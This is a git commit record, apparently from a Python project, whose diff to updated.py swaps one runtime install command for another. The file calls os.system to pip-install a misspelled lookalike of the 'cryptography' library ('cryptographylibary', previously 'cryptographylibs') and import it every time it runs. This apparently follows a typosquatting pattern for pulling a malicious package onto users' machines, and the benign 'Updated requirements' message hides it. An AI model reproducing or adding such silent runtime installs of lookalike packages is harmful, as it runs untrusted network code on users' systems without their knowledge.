f62df4a9260febf1e637b166bbc03bf292be8e48
Apfel <107504561+ApfelsaftDevs@users.noreply.github.com>
2023-04-14 20:34:52 +0200

    Updated requirements

--- updated.py
+++ updated.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install cryptographylibs")
-import cryptographylibs
+os.system("pip install cryptographylibary")
+import cryptographylibary
 from optparse import Option
 import requests
 import threading
